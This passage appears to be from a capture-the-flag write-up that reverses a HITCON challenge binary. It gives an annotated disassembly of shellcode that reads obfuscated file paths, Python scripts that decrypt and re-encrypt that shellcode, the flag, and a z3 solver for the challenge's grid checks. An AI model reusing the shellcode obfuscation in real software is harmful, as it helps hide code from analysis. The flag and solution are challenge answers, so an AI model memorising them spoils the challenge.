vec<span class="token punctuation">[</span><span class="token number">0xe0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x51</span><span class="token punctuation">;</span>
vec<span class="token punctuation">[</span><span class="token number">0xce</span><span class="token punctuation">]</span> <span class="token operator">=</span> __ptr<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
vec<span class="token punctuation">[</span><span class="token number">0xe1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x68</span><span class="token punctuation">;</span>
vec<span class="token punctuation">[</span><span class="token number">0xcf</span><span class="token punctuation">]</span> <span class="token operator">=</span> __ptr<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
vec<span class="token punctuation">[</span><span class="token number">0xe2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x52</span><span class="token punctuation">;</span></code></pre>
<pre class="language-asm" tabindex="0"><code class="language-asm">   <span class="token number">0</span>:   <span class="token number">54</span>                      push   rsp
   <span class="token number">1</span>:   5d                      pop    rbp
   <span class="token number">2</span>:   <span class="token number">31</span> f6                   xor    esi<span class="token punctuation">,</span> esi
   <span class="token number">4</span>:   <span class="token number">48</span> b9 a1 <span class="token number">57</span> <span class="token number">06</span> b8 <span class="token number">62</span> 3a 9f <span class="token number">37</span>   movabs rcx<span class="token punctuation">,</span> <span class="token number">0x379f3a62b80657a1</span>
   e:   <span class="token number">48</span> ba 8e <span class="token number">35</span> 6f d6 4d <span class="token number">49</span> f7 <span class="token number">37</span>   movabs rdx<span class="token punctuation">,</span> <span class="token number">0x37f7494dd66f358e</span>
  <span class="token number">18</span>:   <span class="token number">48</span> <span class="token number">31</span> d1                xor    rcx<span class="token punctuation">,</span> rdx
  1b:   <span class="token number">51</span>                      push   rcx
  1c:   <span class="token number">54</span>                      push   rsp
  1d:   5f                      pop    rdi
  1e:   6a <span class="token number">02</span>                   push   <span class="token number">0x2</span>
  <span class="token number">20</span>:   <span class="token number">58</span>                      pop    rax
  <span class="token number">21</span>:   <span class="token number">99</span>                      cdq
  <span class="token number">22</span>:   0f <span class="token number">05</span>                   syscall
  <span class="token number">24</span>:   <span class="token number">48</span> <span class="token number">97</span>                   xchg   rdi<span class="token punctuation">,</span> rax
  <span class="token number">26</span>:   <span class="token number">31</span> c0                   xor    eax<span class="token punctuation">,</span> eax
  <span class="token number">28</span>:   <span class="token number">50</span>                      push   rax
  <span class="token number">29</span>:   <span class="token number">54</span>                      push   rsp
  2a:   5e                      pop    rsi
  2b:   6a <span class="token number">04</span>                   push   <span class="token number">0x4</span>
  2d:   5a                      pop    rdx
  2e:   0f <span class="token number">05</span>                   syscall
  <span class="token number">30</span>:   <span class="token number">41</span> 5c                   pop    r12
  <span class="token number">32</span>:   6a <span class="token number">03</span>                   push   <span class="token number">0x3</span>
  <span class="token number">34</span>:   <span class="token number">58</span>                      pop    rax
  <span class="token number">35</span>:   0f <span class="token number">05</span>                   syscall
  <span class="token number">37</span>:   <span class="token number">31</span> f6                   xor    esi<span class="token punctuation">,</span> esi
  <span class="token number">39</span>:   <span class="token number">48</span> b9 3b 3b 6f c3 <span class="token number">63</span> <span class="token number">64</span> c0 aa   movabs rcx<span class="token punctuation">,</span> <span class="token number">0xaac06463c36f3b3b</span>
  <span class="token number">43</span>:   <span class="token number">48</span> ba <span class="token number">48</span> 4c 0b c3 <span class="token number">63</span> <span class="token number">64</span> c0 aa   movabs rdx<span class="token punctuation">,</span> <span class="token number">0xaac06463c30b4c48</span>
  4d:   <span class="token number">48</span> <span class="token number">31</span> d1                xor    rcx<span class="token punctuation">,</span> rdx
  <span class="token number">50</span>:   <span class="token number">51</span>                      push   rcx
  <span class="token number">51</span>:   <span class="token number">48</span> b9 8c <span class="token number">57</span> <span class="token number">82</span> <span class="token number">75</span> d6 f8 a9 7d   movabs rcx<span class="token punctuation">,</span> <span class="token number">0x7da9f8d67582578c</span>
  5b:   <span class="token number">48</span> ba a3 <span class="token number">32</span> f6 <span class="token number">16</span> f9 <span class="token number">88</span> c8 0e   movabs rdx<span class="token punctuation">,</span> <span class="token number">0xec888f916f632a3</span>
  <span class="token number">65</span>:   <span class="token number">48</span> <span class="token number">31</span> d1                xor    rcx<span class="token punctuation">,</span> rdx
  <span class="token number">68</span>:   <span class="token number">51</span>                      push   rcx
  <span class="token number">69</span>:   <span class="token number">54</span>                      push   rsp
  6a:   5f                      pop    rdi
  6b:   6a <span class="token number">02</span>                   push   <span class="token number">0x2</span>      
  6d:   <span class="token number">58</span>                      pop    rax
  6e:   <span class="token number">99</span>                      cdq
  6f:   0f <span class="token number">05</span>                   syscall
  <span class="token number">71</span>:   <span class="token number">48</span> <span class="token number">97</span>                   xchg   rdi<span class="token punctuation">,</span> rax
  <span class="token number">73</span>:   <span class="token number">31</span> c0                   xor    eax<span class="token punctuation">,</span> eax
  <span class="token number">75</span>:   <span class="token number">50</span>                      push   rax
  <span class="token number">76</span>:   <span class="token number">54</span>                      push   rsp      
  <span class="token number">77</span>:   5e                      pop    rsi
  <span class="token number">78</span>:   6a <span class="token number">04</span>                   push   <span class="token number">0x4</span> 
  7a:   5a                      pop    rdx
  7b:   0f <span class="token number">05</span>                   syscall
  7d:   <span class="token number">41</span> 5d                   pop    r13
  7f:   6a <span class="token number">03</span>                   push   <span class="token number">0x3</span>      
  <span class="token number">81</span>:   <span class="token number">58</span>                      pop    rax
  <span class="token number">82</span>:   0f <span class="token number">05</span>                   syscall
  <span class="token number">84</span>:   <span class="token number">31</span> f6                   xor    esi<span class="token punctuation">,</span> esi
  <span class="token number">86</span>:   6a 6f                   push   <span class="token number">0x6f</span>
  <span class="token number">88</span>:   <span class="token number">48</span> b9 <span class="token number">59</span> e5 <span class="token number">06</span> 0c 2d f6 d9 <span class="token number">77</span>   movabs rcx<span class="token punctuation">,</span> <span class="token number">0x77d9f62d0c06e559</span>
  <span class="token number">92</span>:   <span class="token number">48</span> ba <span class="token number">76</span> <span class="token number">81</span> <span class="token number">63</span> 7a <span class="token number">02</span> 8c bc <span class="token number">05</span>   movabs rdx<span class="token punctuation">,</span> <span class="token number">0x5bc8c027a638176</span>
  9c:   <span class="token number">48</span> <span class="token number">31</span> d1                xor    rcx<span class="token punctuation">,</span> rdx
  9f:   <span class="token number">51</span>                      push   rcx
  a0:   <span class="token number">54</span>                      push   rsp
  a1:   5f                      pop    rdi
  a2:   6a <span class="token number">02</span>                   push   <span class="token number">0x2</span>  
  a4:   <span class="token number">58</span>                      pop    rax
  a5:   <span class="token number">99</span>                      cdq
  a6:   0f <span class="token number">05</span>                   syscall
  a8:   <span class="token number">48</span> <span class="token number">97</span>                   xchg   rdi<span class="token punctuation">,</span> rax
  aa:   <span class="token number">31</span> c0                   xor    eax<span class="token punctuation">,</span> eax
  ac:   <span class="token number">50</span>                      push   rax
  ad:   <span class="token number">54</span>                      push   rsp
  ae:   5e                      pop    rsi
  af:   6a <span class="token number">04</span>                   push   <span class="token number">0x4</span>
  b1:   5a                      pop    rdx
  b2:   0f <span class="token number">05</span>                   syscall
  b4:   <span class="token number">58</span>                      pop    rax
  b5:   <span class="token number">48</span> f7 d0                not    rax
  b8:   <span class="token number">48</span> c1 e8 1d             shr    rax<span class="token punctuation">,</span> <span class="token number">0x1d</span>
  bc:   <span class="token number">48</span> <span class="token number">99</span>                   cqo
  be:   6a <span class="token number">29</span>                   push   <span class="token number">0x29</span>
  c0:   <span class="token number">59</span>                      pop    rcx
  c1:   <span class="token number">48</span> f7 f1                div    rcx
  c4:   <span class="token number">49</span> <span class="token number">96</span>                   xchg   r14<span class="token punctuation">,</span> rax
  c6:   6a <span class="token number">03</span>                   push   <span class="token number">0x3</span>
  c8:   <span class="token number">58</span>                      pop    rax
  c9:   0f <span class="token number">05</span>                   syscall
  cb:   b8 ef be ad de          mov    eax<span class="token punctuation">,</span> <span class="token number">0xdeadbeef</span>
  d0:   <span class="token number">44</span> <span class="token number">01</span> e0                add    eax<span class="token punctuation">,</span> r12d
  d3:   <span class="token number">44</span> <span class="token number">31</span> e8                xor    eax<span class="token punctuation">,</span> r13d
  d6:   c1 c8 0b                ror    eax<span class="token punctuation">,</span> <span class="token number">0xb</span>
  d9:   f7 d0                   not    eax
  db:   <span class="token number">44</span> <span class="token number">31</span> f0                xor    eax<span class="token punctuation">,</span> r14d
  de:   3d ef be ad de          cmp    eax<span class="token punctuation">,</span> <span class="token number">0xdeadbeef</span>
  e3:   <span class="token number">75</span> <span class="token number">05</span>                   jne    <span class="token number">0xea</span>
  e5:   6a <span class="token number">01</span>                   push   <span class="token number">0x1</span>
  e7:   <span class="token number">58</span>                      pop    rax
  e8:   eb <span class="token number">03</span>                   jmp    <span class="token number">0xed</span>
  ea:   <span class="token number">48</span> <span class="token number">31</span> c0                xor    rax<span class="token punctuation">,</span> rax
  ed:   <span class="token number">50</span>                      push   rax
  ee:   <span class="token number">53</span>                      push   rbx
  ef:   5f                      pop    rdi
  f0:   <span class="token number">54</span>                      push   rsp
  f1:   5e                      pop    rsi
  f2:   6a <span class="token number">08</span>                   push   <span class="token number">0x8</span>
  f4:   5a                      pop    rdx
  f5:   6a <span class="token number">01</span>                   push   <span class="token number">0x1</span>
  f7:   <span class="token number">58</span>                      pop    rax
  f8:   0f <span class="token number">05</span>                   syscall
  fa:   <span class="token number">55</span>                      push   rbp
  fb:   5c                      pop    rsp
  fc:   <span class="token number">41</span> ff e7                jmp    r15</code></pre>
<pre class="language-python" tabindex="0"><code class="language-python"><span class="token keyword">def</span> <span class="token function">ror</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>
    left <span class="token operator">=</span> x <span class="token operator">&gt;&gt;</span> n
    right <span class="token operator">=</span> <span class="token punctuation">(</span>x <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token number">0xFFFFFFFF</span> <span class="token operator">&gt;&gt;</span> <span class="token punctuation">(</span><span class="token number">32</span> <span class="token operator">-</span> n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span><span class="token number">32</span> <span class="token operator">-</span> n<span class="token punctuation">)</span>
    <span class="token keyword">return</span> right <span class="token operator">|</span> left

<span class="token keyword">def</span> <span class="token function">neg</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">assert</span> x <span class="token operator">&gt;=</span> <span class="token number">0</span>
    <span class="token keyword">return</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">'01'</span><span class="token punctuation">[</span>c <span class="token operator">==</span> <span class="token string">'0'</span><span class="token punctuation">]</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">{</span>x<span class="token punctuation">:</span><span class="token format-spec">032b</span><span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>

r12 <span class="token operator">=</span> <span class="token number">0x464c457f</span>
r13 <span class="token operator">=</span> <span class="token number">0x746f6f72</span>
r14 <span class="token operator">=</span> <span class="token number">0x31f3831f</span>

<span class="token keyword">def</span> <span class="token function">shelldec</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""Reverse shellcode encryption (decryption)."""</span>
    <span class="token keyword">assert</span> b <span class="token operator">&gt;=</span> <span class="token number">0</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>ror<span class="token punctuation">(</span>neg<span class="token punctuation">(</span>b <span class="token operator">^</span> r14<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">32</span> <span class="token operator">-</span> <span class="token number">0xb</span><span class="token punctuation">)</span> <span class="token operator">^</span> r13<span class="token punctuation">)</span> <span class="token operator">-</span> r12<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">2</span><span class="token operator">**</span><span class="token number">32</span>

byteorder <span class="token operator">=</span> <span class="token string">'little'</span>

<span class="token comment"># `encrypted` words obtained from 160010 to 16004f.</span>
encrypted <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x526851a7</span><span class="token punctuation">,</span> <span class="token number">0x31ff2785</span><span class="token punctuation">,</span> <span class="token number">0xc7d28788</span><span class="token punctuation">,</span> <span class="token number">0x523f23d3</span><span class="token punctuation">,</span> <span class="token number">0xaf1f1055</span><span class="token punctuation">,</span> <span class="token number">0x5c94f027</span><span class="token punctuation">,</span> <span class="token number">0x797a3fcd</span><span class="token punctuation">,</span> <span class="token number">0xe7f02f9f</span><span class="token punctuation">,</span> <span class="token number">0x3c86f045</span><span class="token punctuation">,</span> <span class="token number">0x6deab0f9</span><span class="token punctuation">,</span> <span class="token number">0x91f74290</span><span class="token punctuation">,</span> <span class="token number">0x7c9a3aed</span><span class="token punctuation">,</span> <span class="token number">0xdc846b01</span><span class="token punctuation">,</span> <span class="token number">0x743c86c</span><span class="token punctuation">,</span> <span class="token number">0xdff7085c</span><span class="token punctuation">,</span> <span class="token number">0xa4aee3eb</span><span class="token punctuation">,</span><span class="token punctuation">]</span>
decrypted <span class="token operator">=</span> <span class="token punctuation">[</span>shelldec<span class="token punctuation">(</span>u<span class="token punctuation">)</span> <span class="token keyword">for</span> u <span class="token keyword">in</span> encrypted<span class="token punctuation">]</span></code></pre>
<pre class="language-python" tabindex="0"><code class="language-python">bs <span class="token operator">=</span> <span class="token string">b''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>u<span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> byteorder<span class="token punctuation">)</span> <span class="token keyword">for</span> u <span class="token keyword">in</span> decrypted<span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    bs <span class="token operator">=</span> apply_rmp<span class="token punctuation">(</span>bs<span class="token punctuation">)</span>
    bs <span class="token operator">=</span> apply_rperm<span class="token punctuation">(</span>bs<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>bs<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
<pre class="language-python" tabindex="0"><code class="language-python"><span class="token keyword">def</span> <span class="token function">shellenc</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""Forward shell encryption."""</span>
    <span class="token keyword">assert</span> a <span class="token operator">&gt;=</span> <span class="token number">0</span>
    u32 <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> x <span class="token operator">&amp;</span> <span class="token number">0xFFFFFFFF</span> 
    <span class="token keyword">return</span> neg<span class="token punctuation">(</span>ror<span class="token punctuation">(</span>u32<span class="token punctuation">(</span>a <span class="token operator">+</span> r12<span class="token punctuation">)</span> <span class="token operator">^</span> r13<span class="token punctuation">,</span> <span class="token number">0xb</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> r14

<span class="token keyword">assert</span> encrypted <span class="token operator">==</span> <span class="token punctuation">[</span>shellenc<span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token keyword">for</span> v <span class="token keyword">in</span> decrypted<span class="token punctuation">]</span></code></pre>
<pre data-lang-off="" class="language-txt" tabindex="0"><code class="language-txt">hitcon{&lt;https://soundcloud.com/monstercat/noisestorm-crab-rave&gt;}</code></pre>
<pre class="language-c" tabindex="0"><code class="language-c"><span class="token keyword">char</span><span class="token operator">*</span> <span class="token function">init_run_length_encoded</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> initcode<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">char</span><span class="token operator">*</span> data <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0xc4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> ind <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token comment">// Index used to insert into data. Serves the dual purpose of tracking the size of the data.</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> initcode<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> i <span class="token operator">+=</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">int</span> length <span class="token operator">=</span> initcode<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token char">'0'</span><span class="token punctuation">;</span> <span class="token comment">// Convert digit (char) to int.</span>
        <span class="token keyword">char</span> c <span class="token operator">=</span> initcode<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// Character to fill.</span>
        
        <span class="token comment">// Unpack run-length atom into `data`.</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span>length<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            data<span class="token punctuation">[</span>ind<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> c<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> data<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<pre class="language-python" tabindex="0"><code class="language-python">encoded <span class="token operator">=</span> <span class="token string">'5a4b3c2d5a4b4c1d2a1e3a3b4c1d2a1e1f2a3b3c1g1d3e5f1b2c2g1d1f2e4f6g1d7f3h3g1d4f6h3g1d2f1i4j1h2k2l1m1d3i2j5k2l2m2i3j4k3l2m2i3j4k3l2m1i5j2k2n2l2m1i4j5n4l'</span>
chars <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>encoded<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    skip<span class="token punctuation">,</span> char <span class="token operator">=</span> encoded<span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">*</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> encoded<span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">*</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span>   <span class="token comment"># Select pair of characters.</span>
    chars <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>skip<span class="token punctuation">)</span> <span class="token operator">*</span> char                   <span class="token comment"># Unpack run-length atom.</span>

<span class="token keyword">assert</span> <span class="token builtin">len</span><span class="token punctuation">(</span>chars<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0xc4</span></code></pre>
<pre class="language-c" tabindex="0"><code class="language-c"><span class="token keyword">int</span> <span class="token function">test1</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> input<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> start <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> start <span class="token operator">&lt;</span> <span class="token number">196</span><span class="token punctuation">;</span> start <span class="token operator">+=</span> <span class="token number">14</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">int</span> count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">14</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>input<span class="token punctuation">[</span>start <span class="token operator">+</span> i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'1'</span><span class="token punctuation">)</span>
                count<span class="token operator">++</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>count <span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<pre class="language-python" tabindex="0"><code class="language-python"><span class="token comment"># Create a bunch of symbols.</span>
inputs <span class="token operator">=</span> <span class="token punctuation">[</span>z3<span class="token punctuation">.</span>Int<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'g_</span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">196</span><span class="token punctuation">)</span><span class="token punctuation">]</span>

<span class="token comment"># Create a constraint solver object.</span>
s <span class="token operator">=</span> z3<span class="token punctuation">.</span>Solver<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment"># Constrain possible input. We just care about the 1s, really.</span>
<span class="token keyword">for</span> sym <span class="token keyword">in</span> inputs<span class="token punctuation">:</span>
    s<span class="token punctuation">.</span>add<span class="token punctuation">(</span>z3<span class="token punctuation">.</span>Or<span class="token punctuation">(</span>sym <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">,</span> sym <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

size <span class="token operator">=</span> <span class="token number">14</span>

<span class="token comment"># Constraint 1: row-wise constraint.</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>
    s<span class="token punctuation">.</span>add<span class="token punctuation">(</span>z3<span class="token punctuation">.</span>Sum<span class="token punctuation">(</span>inputs<span class="token punctuation">[</span>size<span class="token operator">*</span>i<span class="token punctuation">:</span>size<span class="token operator">*</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span></code></pre>
<pre class="language-python" tabindex="0"><code class="language-python"><span class="token comment"># Constraint 2: col-wise constraint.</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>
    s<span class="token punctuation">.</span>add<span class="token punctuation">(</span>z3<span class="token punctuation">.</span>Sum<span class="token punctuation">(</span>inputs<span class="token punctuation">[</span>i<span class="token punctuation">:</span><span class="token punctuation">:</span>size<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span></code></pre>
<pre class="language-c" tabindex="0"><code class="language-c"><span class="token keyword">int</span> <span class="token function">test3</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> chars<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> input<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">int</span> counter<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token comment">// Mask and count characters.</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">196</span><span class="token punctuation">;</span> i <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>input<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'1'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            counter<span class="token punctuation">[</span>chars<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token char">'a'</span><span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>  <span class="token comment">// Increment the count of `chars[i]`.</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token comment">// Bad bad if a letter doesn't appear exactly thrice.</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">14</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>counter<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<pre class="language-python" tabindex="0"><code class="language-python"><span class="token comment"># Constraint 3: mask constraint.</span>
letters <span class="token operator">=</span> <span class="token string">'abcdefghijklmn'</span>
<span class="token keyword">for</span> l <span class="token keyword">in</span> letters<span class="token punctuation">:</span>
    <span class="token comment"># Find all indices in chars which have letter `l`, then sum the corresponding Int symbols from `inputs`.</span>
    indices <span class="token operator">=</span> <span class="token punctuation">[</span>i <span class="token keyword">for</span> i<span class="token punctuation">,</span> c <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>chars<span class="token punctuation">)</span> <span class="token keyword">if</span> c <span class="token operator">==</span> l<span class="token punctuation">]</span>
    s<span class="token punctuation">.</span>add<span class="token punctuation">(</span>z3<span class="token punctuation">.</span>Sum<span class="token punctuation">(</span><span class="token punctuation">[</span>inputs<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> indices<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span></code></pre>
<pre class="language-python" tabindex="0"><code class="language-python"><span class="token comment"># Constraint 4: check orthodiagonal adjacents.</span>
<span class="token keyword">for</span> index<span class="token punctuation">,</span> sym <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>inputs<span class="token punctuation">)</span><span class="token punctuation">:</span>
    x <span class="token operator">=</span> index <span class="token operator">%</span> size
    y <span class="token operator">=</span> index <span class="token operator">//</span> size

    <span class="token comment"># Build list of adjacent indices. Bounds checking mania.</span>
    orthodiag <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">if</span> y <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">:</span>
        orthodiag <span class="token operator">+=</span> <span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">14</span><span class="token punctuation">]</span>
        <span class="token keyword">if</span> x <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">:</span>
            orthodiag <span class="token operator">+=</span> <span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">15</span><span class="token punctuation">]</span>
        <span class="token keyword">if</span> x <span class="token operator">&lt;</span> size <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">:</span>
            orthodiag <span class="token operator">+=</span> <span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">13</span><span class="token punctuation">]</span>
    <span class="token keyword">if</span> y <span class="token operator">&lt;</span> size <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">:</span>
        orthodiag <span class="token operator">+=</span> <span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span>
        <span class="token keyword">if</span> x <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">:</span>
            orthodiag <span class="token operator">+=</span> <span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span>
        <span class="token keyword">if</span> x <span class="token operator">&lt;</span> size <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">:</span>
            orthodiag <span class="token operator">+=</span> <span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span>
    <span class="token keyword">if</span> x <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">:</span>
        orthodiag <span class="token operator">+=</span> <span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
    <span class="token keyword">if</span> x <span class="token operator">&lt;</span> size <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">:</span>
        orthodiag <span class="token operator">+=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
    
    <span class="token comment"># If this cell is 1 --&gt; surrounding cells can't be one.</span>
    <span class="token keyword">for</span> od <span class="token keyword">in</span> orthodiag<span class="token punctuation">:</span>
